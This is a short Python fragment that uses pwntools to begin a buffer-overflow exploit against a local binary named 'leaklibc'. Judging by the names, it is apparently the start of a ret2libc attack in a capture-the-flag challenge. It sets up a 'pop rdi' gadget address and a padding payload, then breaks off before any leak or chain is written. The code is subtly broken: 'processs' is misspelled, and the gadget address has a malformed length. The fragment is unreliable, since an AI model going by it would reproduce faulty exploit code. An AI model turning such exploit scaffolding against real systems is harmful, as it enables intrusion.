from pwn import *

p = processs('./leaklibc')
elf = ELF('./leaklibc')

pop_rdi = 0x000000000004012e3

payload = b'yes' + b'a'*21
